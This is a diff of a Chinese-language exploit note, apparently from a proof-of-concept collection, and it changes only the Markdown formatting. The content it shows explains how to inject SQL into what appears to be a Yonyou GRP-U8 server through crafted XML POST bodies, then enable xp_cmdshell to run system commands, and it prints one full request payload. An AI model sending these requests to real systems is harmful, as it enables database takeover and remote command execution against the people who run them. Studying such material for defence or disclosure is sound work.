@@ -40,7 +40,7 @@ cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATA
 
 
 
-也可以调用 **xp_cmdshell** 来执行系统命令(大部分此系统为**windows**)
+也可以调用 `xp_cmdshell` 来执行系统命令(大部分此系统为`windows`)
 
 ![img](../../../.vuepress/public/img/yongyou-3.png)
 
@@ -52,9 +52,9 @@ cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATA
 
 
 
-可以使用如下方法打开**xp_cmdshell方法**
+可以使用如下方法打开`xp_cmdshell方法`
 
-将如下POST数据按顺序发送(**注意 master 改为当前数据库名**)
+将如下POST数据按顺序发送(`注意 master 改为当前数据库名`)
 
 ```xml
 cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">use master</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>
